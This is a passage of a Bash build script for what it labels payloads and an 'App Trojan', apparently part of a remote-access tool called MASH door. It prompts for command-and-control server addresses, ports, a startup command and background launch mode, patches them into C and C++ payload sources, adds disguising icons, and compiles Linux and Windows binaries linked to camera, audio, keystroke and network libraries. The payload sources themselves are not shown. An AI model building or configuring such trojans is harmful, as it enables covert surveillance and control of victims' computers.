        echo -ne "${CYAN}Enter new HOST (current: $(grep -oP 'const\s+char\*\s+HOST\s*=\s*"\K[^"]+' client.cpp)):${NC} "
        read new_host
    fi
    
    if [ -n "$SERVER_PORT" ]; then
        new_port="$SERVER_PORT"
        echo -e "${GREEN}> Using command-line PORT: $new_port${NC}"
    else
        echo -ne "${CYAN}Enter new PORT (current: $(grep -oP 'const\s+int\s+PORT\s*=\s*\K[0-9]+' client.cpp)):${NC} "
        read new_port
    fi
    
    # Update variables
    if [ -n "$new_host" ]; then
        replace_var "client.cpp" "HOST" "$new_host" "cpp_string"
    fi
    if [ -n "$new_port" ]; then
        replace_var "client.cpp" "PORT" "$new_port" "cpp_num"
    fi
    
    # Show updated variables
    show_variable_changes "client.cpp" "interpreter.cpp"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_INTERPRETER_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_INTERPRETER_NAME}
    fi
    
    # Ask for icon
    if [ -n "$ICON_PATH" ]; then
        icon_path="$ICON_PATH"
        echo -e "${GREEN}> Using command-line icon: $icon_path${NC}"
        add_icon="y"
    else
        echo -ne "${YELLOW}Add custom icon? (y/n):${NC} "
        read add_icon
        if [ "$add_icon" = "y" ]; then
            echo -ne "${CYAN}Enter path to icon image:${NC} "
            read icon_path
        fi
    fi
    res_file=""
    
    if [ "$add_icon" = "y" ] && [ -n "$icon_path" ]; then
        if [ -f "$icon_path" ]; then
            res_file=$(create_icon_resource "$icon_path")
            if [ $? -ne 0 ]; then
                res_file=""
            fi
        else
            echo -e "${RED}Icon file not found.${NC}"
        fi
    fi
    
    # Build
    if [ -n "$PLATFORM" ]; then
        platform_choice="$PLATFORM"
        echo -e "${GREEN}> Using command-line platform: $platform_choice${NC}"
    else
        echo "Select platform:"
        echo "1. Linux"
        echo "2. Windows"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read platform_choice
    fi
    
    build_success=false
    
    case $platform_choice in
        1|linux) 
            if run_with_spinner "g++ -o ${output_name} client.cpp"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        2|windows) 
            local compile_cmd="x86_64-w64-mingw32-g++ client.cpp -o ${output_name}.exe \
            -lws2_32 -static-libgcc -static-libstdc++"
            if [ -n "$res_file" ]; then
                compile_cmd="$compile_cmd $res_file"
            fi
            
            if run_with_spinner "$compile_cmd"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}.exe" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.exe${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        *) 
            echo -e "${RED}Invalid platform. Building for Linux.${NC}"
            if run_with_spinner "g++ -o ${output_name} client.cpp"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
    esac
    
    # Clean up temporary files
    if [ -n "$res_file" ]; then
        rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_c_payload() {
    echo -e "${YELLOW}Building C Payload...${NC}"
    cd "$PC_DIR"
    
    # Select source file
    if [ -n "$PC_SOURCE" ]; then
        source_choice="$PC_SOURCE"
        echo -e "${GREEN}> Using command-line source: $source_choice${NC}"
    else
        echo "Select payload type:"
        echo "1. $(get_payload_display_name "hook.c")"
        echo "2. $(get_payload_display_name "hook2.c")"
        echo "3. $(get_payload_display_name "hook3.c")"
        echo "4. $(get_payload_display_name "hook4.c")"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read source_choice
    fi
    
    case $source_choice in
        1|hook.c) source_file="hook.c"; source_type="hook.c" ;;
        2|hook2.c) source_file="hook2.c"; source_type="hook2.c" ;;
        3|hook3.c) source_file="hook3.c"; source_type="hook3.c" ;;
        4|hook4.c) source_file="hook4.c"; source_type="hook4.c" ;;
        *) echo -e "${RED}Invalid option. Using hook.c${NC}"; source_file="hook.c"; source_type="hook.c" ;;
    esac
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    if [ "$source_type" = "hook.c" ]; then
        echo "Server IP: $(grep -oP 'char\s+server_ip\[16\]\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server Port: $(grep -oP '#define\s+SERVER_PORT\s+\K[0-9]+' "$source_file")"
    else
        echo "Server URL: $(grep -oP '#define\s+SERVER_URL\s+"\K[^"]+' "$source_file")"
        echo "Socket Host: $(grep -oP '#define\s+SOCKET_HOST\s+"\K[^"]+' "$source_file")"
        echo "Socket Port: $(grep -oP '#define\s+SOCKET_PORT\s+\K[0-9]+' "$source_file")"
    fi
    
    # Get new variables
    if [ "$source_type" = "hook.c" ]; then
        if [ -n "$SERVER_IP" ]; then
            new_ip="$SERVER_IP"
            echo -e "${GREEN}> Using command-line server IP: $new_ip${NC}"
        else
            echo -ne "${CYAN}Enter new server IP (current: $(grep -oP 'char\s+server_ip\[16\]\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_ip
        fi
        
        if [ -n "$SERVER_PORT" ]; then
            new_port="$SERVER_PORT"
            echo -e "${GREEN}> Using command-line server port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new server port (current: $(grep -oP '#define\s+SERVER_PORT\s+\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -n "$new_ip" ]; then
            sed -i "s/char server_ip[16] = \"[^\"]*\"/char server_ip[16] = \"$new_ip\"/g" "$source_file"
        fi
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "SERVER_PORT" "$new_port" "c_define_num"
        fi
    else
        if [ -n "$SERVER_URL" ]; then
            new_url="$SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (leave empty for socket mode) (current: $(grep -oP '#define\s+SERVER_URL\s+"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        if [ -n "$SOCKET_HOST" ]; then
            new_host="$SOCKET_HOST"
            echo -e "${GREEN}> Using command-line socket host: $new_host${NC}"
        else
            echo -ne "${CYAN}Enter new socket host (current: $(grep -oP '#define\s+SOCKET_HOST\s+"\K[^"]+' "$source_file")):${NC} "
            read new_host
        fi
        
        if [ -n "$SOCKET_PORT" ]; then
            new_port="$SOCKET_PORT"
            echo -e "${GREEN}> Using command-line socket port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new socket port (current: $(grep -oP '#define\s+SOCKET_PORT\s+\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -z "$new_url" ]; then
            replace_var "$source_file" "SERVER_URL" "EMPTY" "c_define"
        elif [ -n "$new_url" ]; then
            replace_var "$source_file" "SERVER_URL" "$new_url" "c_define"
        fi
        
        if [ -n "$new_host" ]; then
            replace_var "$source_file" "SOCKET_HOST" "$new_host" "c_define"
        fi
        
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "SOCKET_PORT" "$new_port" "c_define_num"
        fi
    fi
    
    # Show updated variables
    show_variable_changes "$source_file" "$source_type"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_HOOK_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_HOOK_NAME}
    fi
    
    # Ask for icon
    if [ -n "$ICON_PATH" ]; then
        icon_path="$ICON_PATH"
        echo -e "${GREEN}> Using command-line icon: $icon_path${NC}"
        add_icon="y"
    else
        echo -ne "${YELLOW}Add custom icon? (y/n):${NC} "
        read add_icon
        if [ "$add_icon" = "y" ]; then
            echo -ne "${CYAN}Enter path to icon image:${NC} "
            read icon_path
        fi
    fi
    res_file=""
    
    if [ "$add_icon" = "y" ] && [ -n "$icon_path" ]; then
        if [ -f "$icon_path" ]; then
            res_file=$(create_icon_resource "$icon_path")
            if [ $? -ne 0 ]; then
                res_file=""
            fi
        else
            echo -e "${RED}Icon file not found.${NC}"
        fi
    fi
    
    # Build
    if [ -n "$PLATFORM" ]; then
        platform_choice="$PLATFORM"
        echo -e "${GREEN}> Using command-line platform: $platform_choice${NC}"
    else
        echo "Select platform:"
        echo "1. Linux"
        echo "2. Windows"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read platform_choice
    fi
    
    build_success=false
    
    case $platform_choice in
        1|linux) 
            if [ "$source_file" = "hook2.c" ]; then
                if run_with_spinner "gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            elif [ "$source_file" = "hook4.c" ]; then
                if run_with_spinner "gcc -o ${output_name} ${source_file} -I/home/zeus/MASH -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            else
                if run_with_spinner "gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            fi
            ;;
        2|windows) 
            local compile_cmd="x86_64-w64-mingw32-gcc -o ${output_name}.exe ${source_file} \
              -lws2_32 -liphlpapi -lwlanapi -lsetupapi -lpowrprof -lwinmm \
              -lole32 -lpsapi -luser32 -lgdi32 -ladvapi32 -lshell32 \
              -loleaut32 -lcomctl32 -lwinspool -limm32 -lmsimg32 -lversion \
              -lcomdlg32 -lshlwapi -lstrmiids -lwtsapi32 -pthread -mwindows -static -luuid -ldxva2 -lwinhttp -lurlmon"
              
            if [ -n "$res_file" ]; then
                compile_cmd="$compile_cmd $res_file"
            fi
            
            if run_with_spinner "$compile_cmd"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}.exe" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.exe${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        *) 
            echo -e "${RED}Invalid platform. Building for Linux.${NC}"
            if [ "$source_file" = "hook2.c" ]; then
                if run_with_spinner "gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            elif [ "$source_file" = "hook4.c" ]; then
                if run_with_spinner "gcc -o ${output_name} ${source_file} -I/home/zeus/MASH -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            else
                if run_with_spinner "gcc -o ${output_name} ${source_file} -lpthread -ldl -lX11 -lXtst -lasound -lcurl \`pkg-config --cflags --libs opencv4\` \`pkg-config --cflags --libs gtk+-3.0\`"; then
                    mkdir -p "$OUTPUT_DIR"
                    cp -f "${output_name}" "$OUTPUT_DIR/"
                    echo -e "${GREEN}Build complete!${NC}"
                    echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                    build_success=true
                else
                    handle_error "Build failed!"
                fi
            fi
            ;;
    esac
    
    # Clean up temporary files
    if [ -n "$res_file" ]; then
        rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_cpp_payload() {
    echo -e "${YELLOW}Building CPP Payload...${NC}"
    cd "$PC_DIR"
    
    # Select source file
    if [ -n "$PC_SOURCE" ]; then
        source_choice="$PC_SOURCE"
        echo -e "${GREEN}> Using command-line source: $source_choice${NC}"
    else
        echo "Select payload type:"
        echo "1. $(get_payload_display_name "webview_pen.cpp")"
        echo "2. $(get_payload_display_name "webview_pen2.cpp")"
        echo "3. $(get_payload_display_name "webview_pen3.cpp")"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read source_choice
    fi
    
    case $source_choice in
        1|webview_pen.cpp) source_file="webview_pen.cpp"; source_type="webview_pen.cpp" ;;
        2|webview_pen2.cpp) source_file="webview_pen2.cpp"; source_type="webview_pen2.cpp" ;;
        3|webview_pen3.cpp) source_file="webview_pen3.cpp"; source_type="webview_pen3.cpp" ;;
        *) echo -e "${RED}Invalid option. Using webview_pen.cpp${NC}"; source_file="webview_pen.cpp"; source_type="webview_pen.cpp" ;;
    esac
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    if [ "$source_type" = "webview_pen.cpp" ]; then
        echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")"
    elif [ "$source_type" = "webview_pen2.cpp" ]; then
        echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")"
        echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")"
        echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")"
    else
        echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")"
        echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")"
        echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server URL: $(grep -oP 'const\s+std::string\s+SERVER_URL\s*=\s*"\K[^"]+' "$source_file")"
    fi
    
    # Get new variables
    if [ "$source_type" = "webview_pen.cpp" ]; then
        if [ -n "$REMOTE_SERVER_URL" ]; then
            new_url="$REMOTE_SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        if [ -n "$REMOTE_SERVER_PORT" ]; then
            new_port="$REMOTE_SERVER_PORT"
            echo -e "${GREEN}> Using command-line server port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new server port (current: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "remote_server_url" "$new_url" "cpp_string"
        fi
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "remote_server_port" "$new_port" "cpp_num"
        fi
    elif [ "$source_type" = "webview_pen2.cpp" ]; then
        if [ -n "$LAUNCH_MODE" ]; then
            new_mode="$LAUNCH_MODE"
            echo -e "${GREEN}> Using command-line launch mode: $new_mode${NC}"
        else
            echo -ne "${CYAN}Enter new launch mode (0=GUI, 1=Background, 2=CLI) (current: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_mode
        fi
        
        if [ -n "$SHOW_POPUP" ]; then
            new_popup="$SHOW_POPUP"
            echo -e "${GREEN}> Using command-line show popup: $new_popup${NC}"
        else
            echo -ne "${CYAN}Show popup? (true/false) (current: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")):${NC} "
            read new_popup
        fi
        
        if [ -n "$STARTUP_COMMAND" ]; then
            new_command="$STARTUP_COMMAND"
            echo -e "${GREEN}> Using command-line startup command: $new_command${NC}"
        else
            echo -ne "${CYAN}Enter new startup command (current: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_command
        fi
        
        if [ -n "$REMOTE_SERVER_URL" ]; then
            new_url="$REMOTE_SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        if [ -n "$REMOTE_SERVER_PORT" ]; then
            new_port="$REMOTE_SERVER_PORT"
            echo -e "${GREEN}> Using command-line server port: $new_port${NC}"
        else
            echo -ne "${CYAN}Enter new server port (current: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_port
        fi
        
        # Update variables
        if [ -n "$new_mode" ]; then
            replace_var "$source_file" "LAUNCH_MODE" "$new_mode" "cpp_num"
        fi
        
        if [ -n "$new_popup" ]; then
            replace_var "$source_file" "SHOW_POPUP" "$new_popup" "cpp_bool"
        fi
        
        if [ -n "$new_command" ]; then
            replace_var "$source_file" "STARTUP_COMMAND" "$new_command" "cpp_string"
        fi
        
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "remote_server_url" "$new_url" "cpp_string"
        fi
        
        if [ -n "$new_port" ]; then
            replace_var "$source_file" "remote_server_port" "$new_port" "cpp_num"
        fi
    else
        if [ -n "$LAUNCH_MODE" ]; then
            new_mode="$LAUNCH_MODE"
            echo -e "${GREEN}> Using command-line launch mode: $new_mode${NC}"
        else
            echo -ne "${CYAN}Enter new launch mode (0=GUI, 1=Background, 2=CLI) (current: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")):${NC} "
            read new_mode
        fi
        
        if [ -n "$SHOW_POPUP" ]; then
            new_popup="$SHOW_POPUP"
            echo -e "${GREEN}> Using command-line show popup: $new_popup${NC}"
        else
            echo -ne "${CYAN}Show popup? (true/false) (current: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")):${NC} "
            read new_popup
        fi
        
        if [ -n "$STARTUP_COMMAND" ]; then
            new_command="$STARTUP_COMMAND"
            echo -e "${GREEN}> Using command-line startup command: $new_command${NC}"
        else
            echo -ne "${CYAN}Enter new startup command (current: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_command
        fi
        
        if [ -n "$SERVER_URL" ]; then
            new_url="$SERVER_URL"
            echo -e "${GREEN}> Using command-line server URL: $new_url${NC}"
        else
            echo -ne "${CYAN}Enter new server URL (current: $(grep -oP 'const\s+std::string\s+SERVER_URL\s*=\s*"\K[^"]+' "$source_file")):${NC} "
            read new_url
        fi
        
        # Update variables
        if [ -n "$new_mode" ]; then
            replace_var "$source_file" "LAUNCH_MODE" "$new_mode" "cpp_num"
        fi
        
        if [ -n "$new_popup" ]; then
            replace_var "$source_file" "SHOW_POPUP" "$new_popup" "cpp_bool"
        fi
        
        if [ -n "$new_command" ]; then
            replace_var "$source_file" "STARTUP_COMMAND" "$new_command" "cpp_string"
        fi
        
        if [ -n "$new_url" ]; then
            replace_var "$source_file" "SERVER_URL" "$new_url" "cpp_string"
        fi
    fi
    
    # Show updated variables
    show_variable_changes "$source_file" "$source_type"
    
    # Get output filename
    if [ -n "$OUTPUT_NAME" ]; then
        output_name="$OUTPUT_NAME"
        echo -e "${GREEN}> Using command-line output name: $output_name${NC}"
    else
        echo -ne "${CYAN}Enter output filename (default: $PC_WEBVIEW_NAME):${NC} "
        read output_name
        output_name=${output_name:-$PC_WEBVIEW_NAME}
    fi
    
    # Ask if user wants to modify GUI (HTML) - only for webview_pen2 and webview_pen3
    if [ "$source_type" = "webview_pen2.cpp" ] || [ "$source_type" = "webview_pen3.cpp" ]; then
        echo -ne "${YELLOW}Modify GUI (HTML content)? (y/n):${NC} "
        read modify_gui
        
        if [ "$modify_gui" = "y" ]; then
            echo -ne "${CYAN}Enter path to HTML file:${NC} "
            read html_path
            
            if [ -f "$html_path" ]; then
                echo -e "${YELLOW}Replacing HTML content in $source_file...${NC}"
                # Find the line number of the LAST occurrence of 'std::string html ='
                last_html_line=$(grep -n 'std::string html =' "$source_file" | tail -1 | cut -d: -f1)
                
                if [ -n "$last_html_line" ]; then
                    # Use awk to replace only after the last occurrence
                    if awk -v start="$last_html_line" -v htmlfile="$html_path" '
                        NR < start { print; next }
                        NR >= start && !found && /R"HTML\(/ {
                            print
                            while ((getline line < htmlfile) > 0) {
                                print line
                            }
                            close(htmlfile)
                            found = 1
                            skip = 1
                            next
                        }
                        /\)HTML"/ && skip { skip = 0; print; next }
                        !skip { print }
                    ' "$source_file" > tmp && mv tmp "$source_file"; then
                        echo -e "${GREEN}HTML content replaced successfully!${NC}"
                    else
                        echo -e "${RED}Failed to replace HTML content.${NC}"
                    fi
                else
                    echo -e "${RED}Could not find 'std::string html =' in the file.${NC}"
                fi
            else
                echo -e "${RED}HTML file not found: $html_path${NC}"
            fi
        fi
    fi
    
    # Ask for icon
    if [ -n "$ICON_PATH" ]; then
        icon_path="$ICON_PATH"
        echo -e "${GREEN}> Using command-line icon: $icon_path${NC}"
        add_icon="y"
    else
        echo -ne "${YELLOW}Add custom icon? (y/n):${NC} "
        read add_icon
        if [ "$add_icon" = "y" ]; then
            echo -ne "${CYAN}Enter path to icon image:${NC} "
            read icon_path
        fi
    fi
    res_file=""
    
    if [ "$add_icon" = "y" ] && [ -n "$icon_path" ]; then
        if [ -f "$icon_path" ]; then
            res_file=$(create_icon_resource "$icon_path")
            if [ $? -ne 0 ]; then
                res_file=""
            fi
        else
            echo -e "${RED}Icon file not found.${NC}"
        fi
    fi
    
    # Build
    if [ -n "$PLATFORM" ]; then
        platform_choice="$PLATFORM"
        echo -e "${GREEN}> Using command-line platform: $platform_choice${NC}"
    else
        echo "Select platform:"
        echo "1. Linux"
        echo "2. Windows"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read platform_choice
    fi
    
    build_success=false
    
    case $platform_choice in
        1|linux) 
            if run_with_spinner "g++ -o ${output_name} ${source_file} \
              -std=c++17 \
              -I./opencv_fix \
              -I/usr/include/opencv4 \
              -L/usr/lib/x86_64-linux-gnu \
              -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
              -lbluetooth \
              -lportaudio \
              -lssl -lcrypto \
              -lpthread \
              -lX11 -lXtst \
              -lboost_system \
              -lboost_thread \
              -I./webview/include -I./webview2_sdk/build/native/include \
              \`pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl\`"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        2|windows) 
            local compile_cmd="x86_64-w64-mingw32-g++ -std=c++17 -DWEBVIEW_EDGE=1 \
-I./webview/include -I./webview2_sdk/build/native/include \
-I$HOME/mingw-libs/include \
-I/usr/x86_64-w64-mingw32/include \
-I$HOME/mingw-libs/include/opencv4 \
-I/usr/x86_64-w64-mingw32/include/gdiplus \
${source_file} -mwindows -o ${output_name}.exe \
-L$HOME/mingw-libs/lib/webview/WebView2LoaderStatic \
-L$HOME/mingw-libs-static/lib \
-L$HOME/mingw-libs/lib \
-L$HOME/mingw-libs/lib64 \
-L$HOME/mingw-libs/lib/opencv4/3rdparty \
-lopencv_world4130 \
-llibopenjp2 -lIlmImf -lade -llibprotobuf \
-llibwebp -llibjpeg-turbo -llibpng -llibtiff -lzlib \
-lpthread -lssl -lcrypto \
-lwinhttp -lbthprops -lportaudio -lwinmm \
-luser32 -lgdi32 -lcomdlg32 -lole32 -loleaut32 -luuid -lversion \
-lshlwapi -lurlmon -lgdiplus -lsetupapi -lksuser -lmswsock -liphlpapi -lws2_32 -limm32 \
-static-libgcc -static-libstdc++ -static -lwinpthread \
-D_WIN32 -D_WIN32_WINNT=0x0600 -DWIN32_LEAN_AND_MEAN"
            
            if [ -n "$res_file" ]; then
                compile_cmd="$compile_cmd $res_file"
            fi
            
            if run_with_spinner "$compile_cmd"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}.exe" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}.exe${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
        *) 
            echo -e "${RED}Invalid platform. Building for Linux.${NC}"
            if run_with_spinner "g++ -o ${output_name} ${source_file} \
              -std=c++17 \
              -I./opencv_fix \
              -I/usr/include/opencv4 \
              -L/usr/lib/x86_64-linux-gnu \
              -lopencv_core -lopencv_imgproc -lopencv_imgcodecs -lopencv_highgui -lopencv_videoio \
              -lbluetooth \
              -lportaudio \
              -lssl -lcrypto \
              -lpthread \
              -lX11 -lXtst \
              -lboost_system \
              -lboost_thread \
              -I./webview/include -I./webview2_sdk/build/native/include \
              \`pkg-config --cflags --libs gtk+-3.0 webkit2gtk-4.1 libcurl\`"; then
                mkdir -p "$OUTPUT_DIR"
                cp -f "${output_name}" "$OUTPUT_DIR/"
                echo -e "${GREEN}Build complete!${NC}"
                echo -e "${GREEN}> Output saved to: $OUTPUT_DIR/${output_name}${NC}"
                build_success=true
            else
                handle_error "Build failed!"
            fi
            ;;
    esac
    
    # Clean up temporary files
    if [ -n "$res_file" ]; then
        rm -f "$res_file" "${res_file%.res}.rc" "${res_file%.res}.ico"
    fi
    
    read -p "Press Enter to continue..."
    build_mash_door_pc
}

build_app_trojan() {
    echo -e "${YELLOW}Building App Trojan...${NC}"
    cd "$PC_DIR"
    
    # Select source file
    if [ -n "$PC_SOURCE" ]; then
        source_choice="$PC_SOURCE"
        echo -e "${GREEN}> Using command-line source: $source_choice${NC}"
    else
        echo "Select payload type:"
        echo "1. $(get_payload_display_name "webview_pen.cpp")"
        echo "2. $(get_payload_display_name "webview_pen2.cpp")"
        echo "3. $(get_payload_display_name "webview_pen3.cpp")"
        echo -ne "${CYAN}Enter your choice:${NC} "
        read source_choice
    fi
    
    case $source_choice in
        1|webview_pen.cpp) source_file="webview_pen.cpp"; source_type="webview_pen.cpp" ;;
        2|webview_pen2.cpp) source_file="webview_pen2.cpp"; source_type="webview_pen2.cpp" ;;
        3|webview_pen3.cpp) source_file="webview_pen3.cpp"; source_type="webview_pen3.cpp" ;;
        *) echo -e "${RED}Invalid option. Using webview_pen.cpp${NC}"; source_file="webview_pen.cpp"; source_type="webview_pen.cpp" ;;
    esac
    
    # Show current variables
    echo -e "${BLUE}Current variables:${NC}"
    if [ "$source_type" = "webview_pen.cpp" ]; then
        echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")"
    elif [ "$source_type" = "webview_pen2.cpp" ]; then
        echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$source_file")"
        echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$source_file")"
        echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$source_file")"
        echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$source_file")"
    else
